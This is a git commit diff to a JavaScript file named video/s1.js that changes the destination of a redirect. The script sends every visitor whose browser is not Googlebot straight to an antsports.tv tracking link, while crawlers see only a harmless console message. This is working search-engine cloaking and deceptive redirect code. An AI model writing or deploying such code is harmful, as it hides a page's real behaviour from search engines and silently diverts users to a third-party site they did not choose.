2a9b3eefce309116207ea5ad284f0cc042be9635
bunsakiroba-cyber <bunsakiroba@gmail.com>
2026-09-11 07:14:11 +0600

    Update s1.js

--- video/s1.js
+++ video/s1.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://antsports.tv/go/3525A305";
+  window.location.href = "https://antsports.tv/go/2048E8C1";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("Thanks for visiting my page");
